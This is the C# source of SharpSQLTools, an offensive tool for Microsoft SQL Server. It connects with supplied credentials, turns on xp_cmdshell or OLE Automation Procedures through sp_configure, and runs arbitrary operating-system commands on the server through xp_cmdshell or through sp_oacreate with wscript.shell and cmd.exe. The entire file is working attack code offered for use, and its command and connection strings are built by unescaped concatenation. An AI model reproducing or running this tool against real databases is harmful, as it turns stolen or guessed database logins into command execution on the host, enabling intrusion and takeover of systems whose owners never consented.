using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Linq;
using System.Text;

namespace SharpSQLTools
{
    class Program
    {
        static void Main(string[] args)
        {
            System.Console.WriteLine("");
            System.Console.WriteLine("Author: Uknow");
            System.Console.WriteLine("Github: https://github.com/uknowsec/SharpSQLTools");
            System.Console.WriteLine("");
            if (args.Length < 7)
            {
                System.Console.WriteLine("Usage: SharpSQLTools.exe -h ip -u username -p password -xp -enable           Enable xp_cmdshell");
                System.Console.WriteLine("       SharpSQLTools.exe -h ip -u username -p password -xp -c \"whoami\"     Exec System Command by xp_cmdshell");
                System.Console.WriteLine("       SharpSQLTools.exe -h ip -u username -p password -sp -enable           Enable SP_OACREATE");
                System.Console.WriteLine("       SharpSQLTools.exe -h ip -u username -p password -sp -c \"whoami\"     Exec System Command by SP_OACREATE");
            }
            if (args.Length >= 7 && (args[6] == "-xp") && (args[7] == "-enable"))
            {
                string cmd = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;";
                exec(args[1], args[3], args[5], cmd);
            }
            if (args.Length >= 7 && (args[6] == "-xp") && (args[7] == "-c"))
            {
                string cmd = "exec master..xp_cmdshell '" + args[8] + "'";
                Console.WriteLine("\r\n========== SharpSQLTools --> Exec System Command by xp_cmdshell ==========\r\n");
                exec(args[1], args[3], args[5], cmd);
            }
            if (args.Length >= 7 && (args[6] == "-sp") && (args[7] == "-enable"))
            {
                string cmd = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'Ole Automation Procedures', 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'show advanced options', 0;";
                exec(args[1], args[3], args[5], cmd);
            }
            if (args.Length >= 7 && (args[6] == "-sp") && (args[7] == "-c"))
            {
                Console.WriteLine("\r\n========== SharpSQLTools --> Exec System Command by SP_OACREATE ==========\r\n");
                string cmd = "declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c " + args[8] + "'";
                exec(args[1], args[3], args[5], cmd);
            }
        }

        public static void exec(String Server, String User, String Password, String exec, String Datebase = "master")
        {
            //sql建立连接
            string connectionString = "Server = " + Server + ";" + "Database = " + Datebase + ";" + "User ID = " + User + ";" + "Password = " + Password + ";";
            SqlConnection conn = new SqlConnection(connectionString);
            try
            {
                conn.Open();
                //TODO:发送Command命令
                SqlCommand cmd = new SqlCommand();
                cmd.Connection = conn;

                //查询数据记录
                cmd.CommandText = exec;
                cmd.CommandType = CommandType.Text;
                SqlDataReader reader = cmd.ExecuteReader();
                Console.WriteLine("Output: \r\n");
                while (reader.Read())
                {
                    Console.WriteLine(reader[0]);
                }
                reader.Close();     //要记得每次调用SqlDataReader读取数据后，都要Close();

            }
            catch (Exception ex)
            {
                Console.WriteLine("Error log: \r\n" + ex.Message);
            }
        }
    }
}
